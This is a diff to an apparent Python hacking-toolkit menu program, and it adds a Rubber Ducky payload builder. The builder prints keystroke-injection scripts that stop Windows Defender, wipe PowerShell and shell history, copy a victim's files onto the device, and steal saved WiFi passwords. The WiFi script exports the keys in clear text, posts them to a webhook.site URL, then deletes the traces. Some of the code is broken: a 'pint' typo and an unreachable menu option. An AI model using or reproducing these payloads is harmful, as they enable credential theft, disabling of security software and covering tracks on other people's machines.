@@ -602,9 +602,6 @@ def foot():
     print(" ")
     print(" ")
 
-
-
-
  ####### --------------------------- ANON SURF --------------------------------- ########
 def Anonsurf():
 
@@ -904,7 +901,7 @@ def OSINT_Tools():
 
     foot()
 
-    option = input("> ")
+    option = input("< ")
 
     if option == "1":
         clear_screen()
@@ -924,7 +921,6 @@ def OSINT_Tools():
             clear_screen()
             OSINT_Tools() 
     
-
 
     
 ######### -----------------------------------------------Monitoring and Recon List ---------------------------------------######
@@ -1123,14 +1119,394 @@ def WiFi():
         time.sleep(1)
         clear_screen()
 
+#######------------------------------------------------Ducky 2 Python--------------------------------------#######
+
+def Ducky2python():
+
+    print('''
+Ducky 2 Pyhon is a program that will turn your ducky script
+into a python script. Written in Javascript, HTML, CSS.
+The program also is a drag and drop feature.
+Script will be saved as PythonScript.py from the ducky2python.py directory        
+        ''')
+    
+    print("1) Install")
+    print("2) Run")
+
+    foot()
+
+    option = input("< ")
+
+    if option == "1":
+        clear_screen()
+        os.system("git clone https://github.com/CedArctic/ducky2python.git")
+        os.system("pip install pyautogui")
+        os.chdir("ducky2python.py")
+
+    elif option == "2":
+        clear_screen()
+        os.system("python3 ducky2python.py")
+
+    elif option == "BACK":
+        clear_screen()
+        cracking_and_breaking()
+
+    elif option == "MAIN":
+        clear_screen()
+        main_menu()
+
+    else:
+        print("\033[91m Do not stray from the path, try again\033[0m")
+        time.sleep(1)
+        clear_screen()
+
+#########---------------------------------------------Build A Ducky------------------------------------#######
+
+def Build_A_Ducky():
+
+    print(''' 
+    This is the Rubber Ducky Builder. 
+    This will be a starting template for a rubber ducky script. 
+    These can be copied and pasted to a notepad for building.
+    ''')
+    print(" ")
+    print("---------------------------------------------------------------------------------------------------")
+    print(" ")
+    print("1) Payload Intro")
+    print("2) Disable Windows")
+    print("3) Turn Defender On")
+    print("4) Passive Windows Detect")
+    print("5) Erase Traces Powershell")
+    print("6) Erace Traces Shell")
+    print("7) Open Powershell")
+    print("8) Open A Shell")
+    print("9) Save Files In Rubber Ducky Storage - Windows")
+    print("10) Grab Wifi Passwords / Must input Webhook ID")
+
+
+    foot()
+
+    option = input("< ")
+
+    
+    if option == "1":
+        print('''
+REM_BLOCK
+#############################
+#                           #
+# Title        : example    #
+# Author       : example    #
+# Version      : 1.0        #
+# Category     : example    #
+# Target       : OS example #
+#                           #
+#############################
+END_REM  
+              ''')
+        
+    elif option == "2":
+        print('''
+DEFAULT_DELAY 1000
+DELAY 10000
+CTRL ESC
+STRING cmd /C "sc stop WinDefend"
+CTRL-SHIFT ENTER
+LEFTARROW
+ENTER               
+              ''')
+        
+    elif option == "3":
+        print('''              
+DDEFAULT_DELAY 1000
+DELAY 10000
+CTRL ESC
+STRING cmd /C "sc start WinDefend"
+CTRL-SHIFT ENTER
+LEFTARROW
+ENTER
+              ''')
+
+    elif option == "4":
+        print('''
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION         
+              ''')
+
+    elif option == "5":
+        print('''
+REM Clear the command history in PowerShell by deleting the history file
+STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath      
+              ''')
+
+    elif option == "6":
+        print('''
+
+REM It is assumed that a shell has already been opened...
+STRINGLN rm $HISTFILE; exit
+            ''')
+
+    elif option == "7":
+        print('''
+GUI r
+DELAY 1000
+STRINGLN PowerShell
+DELAY 1000          
+              ''')
+
+    elif option == "8":
+        print('''
+CTRL-ALT t
+DELAY 1000             
+            ''')
+
+    elif option == "9":
+        print('''
+EXTENSION SAVE_FILES_IN_RUBBER_DUCKY_STORAGE_WINDOWS
+    REM VERSION 1.0
+    REM AUTHOR: Aleff
+    REM_BLOCK Documentation
+        This extension is used to save one or more files through the USB Rubber Ducky storage.
+
+        TARGET:
+            Windows 10/11
+
+        USAGE:
+            Insert this extension when you have one or more files that you want to save in your USB Rubber Ducky.
+
+        CONFIGURATION:
+            Set #DRIVER_LABEL variable with the correct Label of your USB Rubber Ducky considering that the default value is 'DUCK'.
+
+            Set #FLAG_SINGLE_FILE with TRUE if you want to save just one file.
+            In this case you will need to specify the file path within the #SINGLE_PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $fileToSavePath variable to capture this path.
+                i.e. in DuckyScript EXTENSION
+                    DEFINE #SINGLE_PATH C:\Users\Aleff\Downloads\photo.png
+                i.e. in PowerShell before extension
+                    $fileToSavePath = "C:\Users\Aleff\Downloads\photo.png"
+
+            Set #FLAG_SINGLE_FILE FALSE if you want to send multiple files.
+            In this case in the PowerShell you will have to create the variable $fileToSavePaths, which is an array of strings that should contain the list of paths related to the files you want to save.
+                i.e. in PowerShell before extension:
+                    $fileToSavePaths = @(
+                        "C:\Users\Aleff\Downloads\photo.png",
+                        "C:\Users\Aleff\Downloads\document.pdf",
+                        "C:\Users\Aleff\Downloads\song.mp3"
+                    )
+                Some tips:
+                    How to create an Array?
+                        > $fileToSavePaths = @()
+                    How to add an element?
+                        > $fileToSavePaths += "C:\Users\Aleff\Downloads\photo.png"
+                    How to see the array?
+                        > $fileToSavePaths
+    END_REM
+    REM Settings
+    DEFINE #DRIVER_LABEL DUCK
+    DEFINE #FLAG_SINGLE_FILE FALSE
+    DEFINE #SINGLE_PATH 0
+
+    REM Extension Code
+    FUNCTION SAVE_SINGLE_FILE()
+        IF ( #SINGLE_PATH != 0 ) THEN
+            STRINGLN mv #SINGLE_PATH >> ${m}:\
+        ELSE IF ( #SINGLE_PATH == 0 ) THEN
+            STRINGLN mv ${fileToSavePath} >> ${m}:\
+        END_IF
+    END_FUNCTION
+
+    FUNCTION SAVE_MULTIPLE_FILES()
+        STRINGLN
+            foreach ($fileToSavePath in $fileToSavePaths) {
+                mv ${fileToSavePath} >> ${m}:\
+            }
+        END_STRINGLN
+    END_FUNCTION
+
+    STRINGLN $m=(Get-Volume -FileSystemLabel '#DRIVER_LABEL').DriveLetter;
+    IF_DEFINED_TRUE #FLAG_SINGLE_FILE
+        SAVE_SINGLE_FILE()
+    END_IF_DEFINED
+    IF_NOT_DEFINED_TRUE #FLAG_SINGLE_FILE
+        SAVE_MULTIPLE_FILES()
+    END_IF_DEFINED
+END_EXTENSION              
+              ''')
+
+    elif option == "10)":
+        pint('''
+REM Ducky Script for Steal Saved WiFi Password
+REM Author - TechChip
+REM https://github.com/techchipnet
+REM https://youtube.com/techchipnet
+DELAY 500
+GUI r
+DELAY 1000
+STRING cmd /k mode con: cols=25 lines=1
+DELAY 100
+ENTER
+DELAY 1000
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
+ENTER
+DELAY 1000
+DELAY 500
+REM next command will post wifi password on webhook.site
+REM watch demo on techchip youtube channel
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key
+ENTER
+STRING del Wi* /s/f/q
+ENTER
+DELAY 500
+STRING exit
+ENTER             
+            ''')
+
+    elif option == "BACK":
+        clear_screen()
+        Hell()
+
+    elif option == "MAIN":
+        clear_screen()
+        main_menu()
+    else:
+        print("\033[91m Do not stray from the path, try again\033[0m")
+        time.sleep(1)
+        clear_screen()
+        cracking_and_breaking() 
+
+#########------------------------------------------Pre Built Ducky Scripts-------------------------------------------------#######
+
+def Pre_Ducky_Scripts():
+
+    print("This site is still under construction")
+
+    foot()
+
+    option = input ("< ")
+
+
+    if option == "BACK":
+        clear_screen()
+        Hell()
+
+    elif option == "MAIN":
+        clear_screen()
+        main_menu()
+    else:
+        print("\033[91m Do not stray from the path, try again\033[0m")
+        time.sleep(1)
+        clear_screen()
+        cracking_and_breaking() 
+
+##########--------------------------------------Rubber Ducky Script Builder------------------------------------------------#####
+def Rubber_Ducky_Main():
+
+    print('''
+  _      _      _
+>(.)__ <(.)__ =(.)__
+ (___/  (___/  (___/
+ ____             _          
+|  _ \ _   _  ___| | ___   _ 
+| | | | | | |/ __| |/ / | | |
+| |_| | |_| | (__|   <| |_| |
+|____/ \__,_|\___|_|\_\\__, |
+                       |___/           
+          ''')
+
+    print('''
+    Welcome to the Rubber Ducky Home Screen.
+    Do you wish to build your own script or use a pre-built script?
+    ''')
+    print(" ")
+    print("-------------------------------------------------------------------")
+    print(" ")
+    print("1) Pre-Built Ducky Scripts")
+    print("2) Build Your Own Script")
+    print("3) Ducky to Python")
+
+    foot()
+
+    option = input("< ")
+
+    if option == "1":
+        clear_screen()
+        Pre_Ducky_Scripts()
+
+    elif option == "2":
+        clear_screen()
+        Build_A_Ducky()
+
+    elif option == "3":
+        clear_screen()
+        Ducky2python()    
+    
+    elif option == "BACK":
+        clear_screen()
+        Hell()
+
+    elif option == "MAIN":
+        clear_screen()
+        main_menu()
+    else:
+        print("\033[91m Do not stray from the path, try again\033[0m")
+        time.sleep(1)
+        clear_screen()
+        cracking_and_breaking() 
 
 ##### -------------------------------------------Cracking and Breaking ---------------------------------------------#####
 def cracking_and_breaking():
     
+    change()
+
     print("What Are We Cracking Into Today?")
     print("1) Passwords")
     print("2) Accounts")
     print("3) WiFi")
+    print("4) Rubber Ducky Script Builder")
 
     foot()
 
@@ -1147,6 +1523,10 @@ def cracking_and_breaking():
     elif option == "3":
         clear_screen()
         WiFi()
+
+    elif option == "4":
+        clear_screen()
+        Rubber_Ducky_Main()
 
     elif option == "BACK":
         clear_screen()
@@ -1219,8 +1599,11 @@ def Dark_Web_Crawlers():
     print('''
 These are dark web crawlers. Type what you want to search for
 and let them do all the work of compiling URLs.
-        
             ''')
+    print("---------------------------------------------------------------------")
+    print(" ")
+    print("1) Deep Search")
+
 
 
 ##########-------------------------------------------------Dark Web Search Engines---------------------------------------########
